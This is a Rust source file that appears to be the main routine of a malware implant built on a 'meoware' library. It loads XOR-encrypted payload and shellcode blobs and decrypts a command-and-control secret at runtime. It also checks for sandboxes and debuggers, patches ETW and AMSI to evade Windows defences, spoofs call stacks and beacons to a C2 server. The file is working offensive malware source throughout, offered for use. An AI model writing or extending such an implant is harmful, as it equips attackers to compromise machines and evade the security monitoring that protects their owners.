#![cfg_attr(not(any(debug_assertions, feature = "verbose")), no_std)]

use meoware::core::net::beacon;
use meoware::core::{amsi, anti_debug, etw, migration, sandbox, spoof, ssn_table};
use meoware::debug;

// Build time generated key
include!(concat!(env!("OUT_DIR"), "/xor_key.rs"));

// Encrypted payload
const ENCRYPTED_PE: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/payload.enc"));
const ENCRYPTED_SC: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/shellcode.enc"));

// C2 Configuration
include!(concat!(env!("OUT_DIR"), "/c2_config.rs"));

// Runtime XOR decryption
fn xor_decrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter().enumerate().map(|(i, b)| b ^ key[i % key.len()]).collect()
}


fn main() {
    unsafe {
        if !ssn_table::initialize_syscalls(core::ptr::null_mut()) {
            return;
        }

        if !sandbox::is_real_environment() {
            debug!("[SANDBOX] Environment check failed — aborting");
            return;
        }

        if !anti_debug::is_safe_environment() {
            debug!("[ANIT] Environment check failed - aborting");
            return;
        }

        etw::patch_etw();
        amsi::patch_amsi();
        spoof::initialize_spoof_gadgets();

        // let shellcode = xor_decrypt(ENCRYPTED_SC, &XOR_KEY);
        // debug!("[*] Migrating ({} bytes)", shellcode.len());
        // if migration::self_migrate(&shellcode) {
        //     debug!(" [*] Done - exiting");
        //     return;
        // }

        let c2_secret = xor_decrypt(&C2_SECRET_ENC, &XOR_KEY);

        let c2_config = beacon::C2Config {
            host: &C2_HOST,
            port: C2_PORT,
            use_https: C2_HTTPS,
            secret: &c2_secret,
            interval_ms: C2_INTERVAL,
            jitter_pct: C2_JITTER,
        };

        beacon::beacon_loop(&c2_config);
    }
}
